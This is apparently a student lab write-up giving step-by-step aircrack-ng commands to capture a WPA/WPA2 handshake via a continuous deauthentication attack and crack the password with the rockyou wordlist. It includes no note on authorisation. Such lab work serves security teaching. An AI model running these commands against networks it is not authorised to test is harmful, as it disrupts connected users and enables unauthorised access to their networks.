# Name: Abhinav Ganeshan

# Reg no: 22BCI0013

### Step 1: Identify Your Wireless Interface

First, we need to identify our wireless interface:

```bash
lsusb
```

This command lists all USB devices connected to your computer, which helps identify your wireless adapter.

<img src='/screenshots/1.png'>

```bash
iwconfig
```

This command shows all wireless interfaces.

<img src='/screenshots/2.png'>

### Step 2: Enable Monitor Mode

By default, wireless cards operate in "managed" mode, which only processes packets addressed to your device. We need to switch to "monitor" mode to capture all packets in the air.

```bash
airmon-ng start wlan0
```

Replace `wlan0` with your actual interface name. After executing this command, your interface name might change to something like `wlan0mon`.

```bash
iwconfig
```

Look for "Mode:Monitor" in the output for your wireless interface.

<img src='/screenshots/3.png'>

### Step 3: Scan for WiFi Networks

Now we'll scan for available WiFi networks:

```bash
airodump-ng wlan0mon
```

This will display all WiFi networks in range. The output includes:

- BSSID (MAC address of the access point)
- PWR (signal strength)
- Beacons (number of announcements from AP)
- #Data (number of captured data packets)
- CH (channel)
- MB (maximum speed supported)
- ENC (encryption type, such as WEP, WPA, or WPA2)
- ESSID (network name)

<img src='/screenshots/4.png'>

### Step 4: Target a Specific Network

Once you've identified your target network, press CTRL+C to stop the scan. Now we'll focus on capturing data from a specific network:

```bash
airodump-ng -c [channel] -w [filename] --bssid [target_bssid] wlan0mon
```

For example:

```bash
airodump-ng -c 2 -w capture --bssid 00:11:22:33:44:55 wlan0mon
```

Where:

- `-c 2` specifies channel 2
- `-w capture` saves the capture to files prefixed with "capture"
- `--bssid 00:11:22:33:44:55` filters for the specific access point

Leave this terminal window running to capture packets.

<img src='/screenshots/5.png'>

### Step 5: Capture the WPA/WPA2 Handshake

To crack a WPA/WPA2 network, we need to capture the 4-way handshake that occurs when a client connects to the network. We can force a reconnection using a deauthentication attack:

Open a new terminal window and run:

```bash
aireplay-ng --deauth 0 -a [target_bssid] -c [client_bssid] wlan0mon
```

For example:

```bash
aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Where:

- `--deauth 0` sends continuous deauthentication packets (use a number like 10 for a limited number)
- `-a 00:11:22:33:44:55` is the MAC address of the access point
- `-c AA:BB:CC:DD:EE:FF` is the MAC address of a connected client

<img src='/screenshots/6.png'>

If you don't have a client MAC address, you can omit the `-c` parameter to deauthenticate all clients.

Once you see "WPA handshake: [BSSID]" in the airodump-ng window, you've successfully captured the handshake. You can now press CTRL+C in both terminal windows to stop the capture and deauthentication.

<img src='/screenshots/7.png'>

### Step 6: Crack the Password

Now we'll use aircrack-ng to crack the password using a dictionary attack:

```bash
aircrack-ng [capture_file] -w [wordlist]
```

For example:

```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

The rockyou.txt wordlist is a common password list available on Kali Linux. If the password is in the wordlist, aircrack-ng will eventually find it.

<img src='/screenshots/8.png'>

<img src='/screenshots/9.png'>

### Step 7: Analyzing Captured Data

You can use Wireshark to analyze the captured packets:

```bash
wireshark capture-01.cap
```

This allows you to inspect the handshake and other network traffic.

### Disabling Monitor Mode

When you're done, return your wireless interface to managed mode:

```bash
airmon-ng stop wlan0mon
```
